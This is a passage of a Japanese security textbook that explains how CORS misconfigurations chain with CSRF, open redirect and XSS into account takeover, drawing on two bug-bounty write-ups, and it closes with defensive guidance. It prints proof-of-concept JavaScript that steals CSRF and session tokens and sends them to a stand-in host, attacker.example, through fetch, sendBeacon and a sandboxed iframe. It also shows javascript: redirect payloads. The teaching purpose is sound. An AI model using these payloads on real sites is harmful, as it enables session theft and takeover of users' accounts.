## CORS→CSRFトークン窃取→ATOの連鎖

第8章のこれまでの節では、CSRFとCORSを「それぞれ単体の脆弱性」として扱ってきました。しかし現実のバグバウンティで高額報酬（Critical判定）を生むのは、多くの場合**単体の脆弱性ではなく連鎖（chain）**です。とりわけCORSとCSRFは、片方が「攻撃者が別オリジンからレスポンスを読める」性質を持ち、もう片方が「そのレスポンスの中に秘密（CSRFトークン、セッショントークン）が入っている」構造を持つため、**組み合わさると互いの防御を無力化し合う**という危険な相性を持っています。

この節では、実在の2本のライトアップを土台に、次の2つの連鎖パターンを仕組みレベルで解剖します。

1. **CORS設定ミス → CSRFトークンの窃取 → プロフィール改変CSRF → アカウント乗っ取り（ATO）**（資料1）
2. **オープンリダイレクト → XSS → CORS設定ミス → セッショントークン窃取 → 1クリックATO**（資料2）

> ⚠️ **取得に関する注記**: 本節が参照する2本のMedium記事は、自動取得時にいずれも `HTTP 403 Forbidden`（Mediumのボット遮断）で直接本文を取得できませんでした。以下の記述は、記事タイトル・検索エンジン経由で得られた各記事の要約スニペット・および筆者（本教科書執筆者）のCORS/CSRFに関する一般知識を突き合わせて**再構成**したものです。攻撃対象となった実在サービス名・具体的なドメインは伏せられており、本文中のヘッダ値・エンドポイント名・コードは**原理を説明するための代表的な再現例**です。正確な原文は各節末尾のURLからご自身でご確認ください。

---

### なぜCORSとCSRFトークンは「敵対」するのか（前提の整理）

連鎖を理解する前に、両者の防御原理が**同じ前提に立っている**ことを押さえます。

- **CSRFトークン**（別名: anti-CSRFトークン、synchronizer token）とは、サーバがフォームやセッションに埋め込む、推測困難なランダム値です。状態変更リクエスト（プロフィール更新、パスワード変更など）を受け取ったサーバは「このトークンが一致しなければ処理しない」と検査します。攻撃者は被害者のブラウザにリクエストを**送らせる**ことはできても、**トークンの値を知らない**ため、正しいリクエストを組み立てられない――これがCSRF対策の核心です。
- **CORS（Cross-Origin Resource Sharing）**とは、ブラウザの同一オリジンポリシー（SOP: 別オリジンのJavaScriptがレスポンス本文を読むことを禁じる規則）を、サーバの明示的な許可があるときだけ緩める仕組みです。サーバがレスポンスに `Access-Control-Allow-Origin`（以下ACAO）ヘッダを付けて「このオリジンには読ませてよい」と宣言します。

ここに**根本的な矛盾**が潜みます。CSRFトークンの防御は「攻撃者はトークン値を**読めない**」という前提に依存しています。ところがCORS設定がミスっていて、攻撃者オリジンに対してもレスポンス本文の読み取りを許してしまうと、**攻撃者はトークンが埋め込まれたページ／APIレスポンスを別オリジンから読み取れてしまう**。つまり、CSRFトークンという防御の**唯一の前提が崩壊する**のです。

#### 「危険なCORS設定」の具体的な形

CORSが「悪用可能」になる条件は、次の2つが**同時に**成立するときです。

```http
# サーバのレスポンス（危険な例）
Access-Control-Allow-Origin: https://attacker.example      ← 攻撃者オリジンをそのまま反射
Access-Control-Allow-Credentials: true                     ← Cookie等の認証情報付きを許可
```

- **ACAOにリクエストの `Origin` をそのまま反射（reflect）している**: サーバ実装が「送られてきた `Origin` ヘッダの値をコピーしてACAOに入れる」と、事実上**あらゆるオリジン**が許可されます。`Access-Control-Allow-Origin: *`（ワイルドカード）は一見危険ですが、後述のとおり `*` は認証情報付きリクエストでは**使えない**ため、むしろ「反射型」の方が悪用しやすいのです。
- **`Access-Control-Allow-Credentials: true` が付いている**: これが無いと、ブラウザは `withCredentials`（Cookie付き）で送ったレスポンスをJavaScriptに渡しません。これが `true` のときだけ、**被害者のログイン済みセッションで認証されたレスポンス本文**を攻撃者JSが読めます。

> **仕組みの核心**: 仕様上、`Access-Control-Allow-Origin: *` と `Access-Control-Allow-Credentials: true` は**併用できません**（ブラウザがレスポンスを拒否する）。だからこそ攻撃者にとって美味しいのは「`Origin` を反射しつつ `Credentials: true`」という組み合わせです。これなら特定オリジン（攻撃者ドメイン）宛のACAOになり、かつ認証付きレスポンスを読める、という両立が成立してしまいます。開発者が「`*` は危ないから `Origin` を動的に返そう」と善意で書いたコードが、検証を怠ると最悪の設定になるわけです。

---

### 資料1: CORS設定ミス → CSRFトークン窃取 → プロフィール改変によるATO

このライトアップの本質は、**2つの脆弱性の連鎖**です。単体では低〜中程度の2つのバグが、組み合わさることでアカウント乗っ取りに昇格します。

- **バグA（CORS設定ミス）**: パスワードリセット関連のエンドポイントが、認証情報付きのクロスオリジンリクエストに対して、レスポンス本文をそのまま返す設定になっていた。そのレスポンス本文の中に**CSRFトークンが含まれていた**。
- **バグB（CSRF）**: プロフィール更新エンドポイント（氏名・メールアドレス・国などを変更する機能）が、`Origin` チェックやCSRFトークンだけに依存しており、**トークンさえ正しければクロスオリジンからでも状態変更を受け付ける**状態だった。

単体で見ると、バグBは「有効なCSRFトークンが必要」なので、通常のCSRF攻撃（攻撃者はトークンを知らない）では成立しません。ところが**バグAでトークンを盗めば**、バグBの唯一の防壁が消え、攻撃者は被害者のメールアドレスを自分のものに書き換えられます。メールを書き換えれば、そこにパスワードリセットリンクを送ってパスワードを掌握でき、**完全なアカウント乗っ取り**が完成します。

#### ステップ1: CSRFトークンを盗む攻撃者ページ

被害者がログイン中に攻撃者のページを開いた瞬間、次のようなスクリプトが走ります。原理を示す代表的な再現コードです。

```html
<!-- attacker.example に置かれた悪意あるページ -->
<script>
  // 被害者のセッションCookie付きで、CSRFトークンを含むエンドポイントを叩く
  fetch('https://victim-app.example/account/reset-password', {
    method: 'GET',
    credentials: 'include'   // ← 被害者のCookieを一緒に送る。これが肝
  })
  .then(res => res.text())   // CORSが許可されているのでレスポンス本文を読める
  .then(body => {
    // レスポンス（HTMLやJSON）からCSRFトークンを抽出
    const token = body.match(/name="csrf_token" value="([^"]+)"/)[1];
    // 盗んだトークンを攻撃者サーバへ送信
    return fetch('https://attacker.example/collect?t=' + encodeURIComponent(token));
  });
</script>
```

**なぜこれで盗めるのか**:

1. `credentials: 'include'` により、ブラウザはリクエストに `victim-app.example` の**セッションCookieを自動付与**します。サーバから見れば「ログイン済み本人からのリクエスト」に見え、CSRFトークンを含む個人向けレスポンスを返します。
2. 通常であればSOPにより、`attacker.example` のJSはこのレスポンス本文を**読めません**。しかしサーバがリクエストの `Origin: https://attacker.example` を反射して `Access-Control-Allow-Origin: https://attacker.example` と `Access-Control-Allow-Credentials: true` を返すため、ブラウザは「読み取りOK」と判断し、`res.text()` が成功します。
3. こうしてレスポンス内の `csrf_token` が攻撃者の手に渡ります。

> **補足（SameSite Cookieとの関係）**: この攻撃は「被害者のCookieがクロスオリジンfetchに載る」ことが大前提です。近年のブラウザはセッションCookieの `SameSite` 属性を明示指定がない場合 `Lax` 相当として扱うため、**クロスサイトのJSリクエストにはCookieが送られない**のが既定動作です。したがってこの連鎖が刺さるのは、対象がセッションCookieに `SameSite=None; Secure` を付けている（サードパーティ文脈でCookie送信を許している）場合が中心です。裏を返せば、`SameSite=Lax/Strict` は本連鎖に対する強力な緩和策になります。

#### ステップ2: 盗んだトークンでプロフィールを改ざん（メール乗っ取り）

トークンを入手したら、それを使って被害者のメールアドレスを攻撃者のものに書き換えます。

```html
<script>
  // ステップ1で盗んだ token を使う
  fetch('https://victim-app.example/account/update-profile', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'first_name=x&last_name=x&country=US' +
          '&email=attacker@evil.example' +   // ← 被害者のメールを乗っ取る
          '&csrf_token=' + stolenToken
  });
</script>
```

**なぜこれでATOに至るのか**:

- 更新エンドポイントは「有効なCSRFトークン＋有効なセッション」を満たすリクエストを正規のものと信じます。両方とも被害者のブラウザ経由で満たされているため、サーバはメール変更を実行します。
- メールアドレスを攻撃者のものにすげ替えた後、通常のパスワードリセット機能を使えば、リセットリンクは**攻撃者のメールボックス**に届きます。攻撃者はパスワードを設定し直し、被害者を締め出して**アカウントを完全に掌握**します。

この連鎖の教訓は明確です。**CSRFトークンは「秘密であること」でしか守れない。CORS設定ミスは、その秘密を漏らすチャネルになる。** ゆえにCSRF対策とCORS設定は「別々の担当領域」ではなく、**同じ脅威モデルの中で一緒に検証すべき**ものなのです。

> 出典: From CORS Misconfigration To CSRF Account Takeover（Mustafa Adam Gamaraldin Abdalla） — https://wadgamaraldeen.medium.com/from-cors-misconfigration-to-csrf-account-takeover-ce5d85f41eda

---

### 資料2: オープンリダイレクト → XSS → CORS → セッショントークン窃取（1クリックATO）

2本目のライトアップは、**4つの脆弱性を段階的に昇格（escalation）させる**古典的かつ教育的な連鎖です。各段階で深刻度が上がっていくのが見どころです。

| 段階 | 脆弱性 | 単体での深刻度 | 連鎖後の役割 |
|---|---|---|---|
| 1 | オープンリダイレクト | Low | 被害者を細工URLへ誘導する足がかり |
| 2 | 反射型XSS | Medium | 信頼された同一オリジンでJSを実行 |
| 3 | CORS設定ミス | Medium | セッショントークンをJSで読み取り可能に |
| 4 | セッショントークン窃取 | → **Critical (ATO)** | 盗んだトークンで本人になりすまし |

#### 段階1〜2: オープンリダイレクトからXSSへ

- **オープンリダイレクト**とは、`?redirect=` や `?next=` のようなパラメータで指定された任意URLへ、検証なしにブラウザを飛ばしてしまう脆弱性です。単体では「フィッシングの信頼性を高める」程度でLow判定になりがちです。ログイン後に攻撃者ドメインへ飛ばされることでリダイレクト先が無検証だと確認されました。
- ここから**XSSへ昇格**します。リダイレクト処理が `javascript:` スキームのURLまで受け入れてしまう、あるいは戻り先パラメータがHTMLに反射される場合、`javascript:alert(1)` のようなペイロードでJavaScript実行に持ち込めます。XSSが成立すると、**攻撃者のJSが「被害者が信頼する正規オリジン上」で動く**――これが決定的に重要です。同一オリジンで動くJSは、SOPの制約を受けずにそのオリジンのAPIを叩けるからです。

```
# 段階1: オープンリダイレクト（無検証の戻り先）
https://victim-app.example/login?next=https://attacker.example

# 段階2: リダイレクト経路にjavascript:を注入してXSSへ昇格
https://victim-app.example/login?next=javascript:alert(document.domain)
```

#### 段階3〜4: `/api/auth/session` からトークンを抜く

この連鎖の核心は、**`/api/auth/session` というエンドポイントが、現在ログイン中ユーザーのアクセストークン（セッショントークン）をJSONで返していた**点にあります。

> **仕組みの核心（`/api/auth/session` とは何か）**: `/api/auth/session` は、Next.js向け認証ライブラリ **NextAuth.js（現Auth.js）** が既定で公開するエンドポイントです。フロントエンドのクライアントJSが「今のログイン状態」を取得するために叩く設計で、レスポンスにはユーザー情報や、設定によっては `accessToken` が平文JSONで含まれます。**本来はサイト自身のフロントJSだけが読むべきもの**ですが、CORSが誤って外部オリジンに開かれていると、外部のJSからでもこの機微なJSONを読めてしまいます。設計者が「フロントが使う内部API」と油断しがちな箇所で、だからこそ狙われます。

段階2のXSS（同一オリジン実行）と組み合わさると、次のような窃取が成立します。

```javascript
// 正規オリジン上で走るXSSペイロード（同一オリジンなのでCORSすら要らないことも多い）
fetch('/api/auth/session', { credentials: 'include' })
  .then(r => r.json())
  .then(session => {
    // session.accessToken に本人のトークンが入っている
    navigator.sendBeacon(
      'https://attacker.example/steal',
      JSON.stringify(session)
    );
  });
```

さらにライトアップでは、XSSを経由せず**CORS単体でこのJSONを読む**経路も示されています。ここで登場するのが `Origin: null` を悪用する**サンドボックス化iframe**のテクニックです。

```html
<!-- attacker.example のページ。ACAO: null を信頼するサーバに刺さる -->
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://victim-app.example/api/auth/session', {
      credentials: 'include'
    })
    .then(r => r.text())
    .then(d => {
      // 盗んだセッションJSONを画像リクエストで外部送信
      new Image().src = 'https://attacker.example/steal?d=' + encodeURIComponent(d);
    });
  <\/script>
"></iframe>
```

**なぜ `sandbox` 属性でトークンが盗めるのか**:

- `sandbox="allow-scripts"` を付けたiframeは、JavaScriptの実行は許可しつつ、**そのフレームの生成元（origin）を剥ぎ取り、`Origin` ヘッダを文字列 `null` にして**リクエストを送ります（`data:` URIや `file:` URIも同様に `null` になります）。
- サーバが「`Access-Control-Allow-Origin: null` を返す（=`null` オリジンを信頼する）」設定だと、ブラウザは「このオリジンには読ませてOK」と誤認し、認証付きレスポンス本文をJSに渡します。開発者がテスト目的で `null` を許可リストに入れたまま本番に残す、というのがよくある原因です。
- `srcdoc` はiframeの中身HTMLをインラインで埋め込む属性で、外部ファイルを用意せずワンショットで攻撃コードを流し込めます。

こうして得た `accessToken` を攻撃者が自分のリクエストの `Authorization: Bearer <token>` に載せれば、被害者本人としてAPIを叩けます。ライトアップは「ページ読み込みからアカウント侵害まで2分未満、フィッシングもマルウェアもログ上のアラートも無し」と、**1クリックATOの静かな恐ろしさ**を強調しています。

> 出典: 1-Click Account Takeover (ATO) via CORS Misconfiguration（Muhammed Mubarak） — https://medium.com/@mohammed01550038865/1-click-account-takeover-ato-via-cors-misconfiguration-64dc26d24917

---

### 連鎖を成立させる「条件」を分解する

2つの資料を横断すると、CORS→トークン窃取→ATOの連鎖が成立するには、次の**すべて**が揃う必要があることが分かります。逆に言えば、どれか1つを断てば連鎖は切れます。

1. **秘密がレスポンス本文に入っている**: CSRFトークンやアクセストークンが、GETで取得できるHTML/JSONに含まれている。
2. **CORSが認証付きで外部に開いている**: `Origin` の反射＋`Credentials: true`、または `null` の許可。
3. **Cookieがクロスサイトで送られる**: セッションCookieが `SameSite=None; Secure`（もしくはトークンがCookieでなくレスポンスJSONで返る設計）。
4. **盗んだ秘密で状態変更・なりすましができる**: そのトークンだけでメール変更やAPI呼び出しが通る。

#### 「単体は低リスク」の罠

このテーマの最大の教訓は、**トリアージ（深刻度判定）を単体で行う危険性**です。オープンリダイレクト単体はLow、CORS設定ミス単体も「機微データが返らなければInfo〜Low」と見なされがちです。しかし、

- オープンリダイレクト（Low）＋ XSS昇格 ＋ CORS（Medium）＝ **Critical (ATO)**
- CORS（Medium）＋ CSRFトークン漏洩 ＋ プロフィール更新CSRF（Medium）＝ **Critical (ATO)**

というように、**低リスクの部品が組み合わさって最高深刻度に化ける**のがこの分野の特徴です。防御側は「この単体バグは大したことない」と切り捨てる前に、**そのバグが他のどんなバグと連鎖しうるか**を必ず問う必要があります。

---

### 防御: 連鎖のどの環でも断てる

防御目的の観点から、各環に対する具体的な対策を整理します。**多層防御**の考え方で、複数を併用するのが原則です。

#### CORS設定を厳格化する（環2を断つ）

- **`Origin` を無検証で反射しない**。許可オリジンは**サーバ側の固定許可リスト（allowlist）と完全一致**で検証する。前方一致・後方一致（`endsWith('victim-app.example')` など）は `victim-app.example.attacker.com` を通してしまうため厳禁。
- **`Access-Control-Allow-Credentials: true` は本当に必要なエンドポイントだけに限定**する。認証付きレスポンスを外部に開く必然性がなければ付けない。
- **`null` オリジンを許可リストに入れない**。サンドボックスiframe／`data:` URI経由の窃取を防ぐ。
- 機微なJSON（`/api/auth/session` など）は、そもそもクロスオリジンで読めないよう、CORSをデフォルト拒否にする。

#### 秘密をレスポンスに載せない・トークンをCookieに閉じ込める（環1・環3を断つ）

- アクセストークンを**JSから読めるレスポンスJSONに入れない**。可能なら `HttpOnly; Secure; SameSite=Lax`（または `Strict`）のCookieに格納し、JSからもクロスサイトfetchからも読めなくする。
- セッションCookieに **`SameSite=Lax` 以上**を設定する。これだけで「クロスサイトJSにCookieが載る」前提が崩れ、資料1・資料2の窃取経路の多くが機能しなくなる。`SameSite=None` を使うなら、その必然性を厳しく吟味する。

#### CSRF対策をトークン単独に依存させない（環1・環4を断つ）

- CSRFトークンは**セッション単位でランダム生成**し、レスポンスへの露出を最小化する。加えて `SameSite` Cookie・カスタムリクエストヘッダ要求（`X-Requested-With` 等）・`Origin`/`Referer` の**サーバ側検証**を組み合わせ、トークンが漏れても即ATOにならない設計にする。
- メールアドレス変更・パスワード変更といった**クリティカルな操作には、現在のパスワード再入力や再認証（step-up authentication）を要求**する。盗んだトークン1つで即メール乗っ取り→リセット、という連鎖を最終段で断ち切れる。

#### XSS・オープンリダイレクトを潰す（連鎖の起点を断つ）

- リダイレクト先は**相対パスのみ許可**、または許可リスト照合する。`javascript:` などの危険スキームを拒否する。
- 出力エスケープとContent Security Policy（CSP）でXSSを抑止する。XSSが無ければ「同一オリジンでのトークン窃取」という最強経路が塞がる。

---

### この節のまとめ

- CORSとCSRFトークンは、どちらも「攻撃者は秘密を**読めない**」という同じ前提に立つ。CORS設定ミスはその前提を破壊し、CSRF対策を無効化する。
- 資料1は「CORSでCSRFトークンを盗み、プロフィール更新CSRFでメールを乗っ取る」2脆弱性連鎖。資料2は「オープンリダイレクト→XSS→CORS→`/api/auth/session` のトークン窃取」の4段階連鎖。いずれも**低リスク部品の合成でCritical（ATO）に到達**する。
- 連鎖成立には「秘密がレスポンスに入る／CORSが認証付きで開く／Cookieがクロスサイトで飛ぶ／盗んだ秘密でなりすませる」の4条件が必要。**どれか1つを断てば連鎖は切れる**。
- 防御は多層で。CORS厳格化・`SameSite` Cookie・トークンの非露出・クリティカル操作の再認証・XSS/オープンリダイレクト対策を組み合わせる。
